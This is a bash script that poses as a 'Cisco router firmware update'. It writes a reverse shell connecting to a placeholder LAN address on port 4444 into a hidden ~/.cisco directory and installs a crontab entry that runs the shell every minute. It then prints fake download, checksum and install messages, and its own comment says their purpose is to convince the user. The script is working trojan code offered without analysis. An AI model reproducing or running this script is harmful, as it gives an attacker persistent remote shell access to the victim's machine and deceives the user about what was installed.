#!/bin/bash

mkdir ~/.cisco

cd ~/.cisco

#create the reverse shell
touch shell.cgi
echo "/bin/bash -i >& /dev/tcp/192.168.0.xxx/4444 0<&1" > shell.cgi
chmod 777 shell.cgi

#add the reverse shell to the user's crontab for regular execution every minute
touch temp
crontab -l > temp
echo "* * * * * ~/.cisco/shell.cgi" >> temp
crontab temp
rm temp

#provide some output for the user to convince them we are actually doing something useful
echo "CISCO ROUTER FIRMWARE UPDATE v4.1.3"
sleep 1
echo "DOWNLOADING UPDATE"
sleep 3
echo "...OK"
echo "COMPARING CHECKSUM"
echo "...OK"
echo "PREPARING DIRECTORY FOR INSTALLATION"
sleep 2
echo "...OK"
echo "INSTALLING UPDATE"
sleep 2
echo "...OK"
echo "INSTALLATION COMPLETE"
sleep 3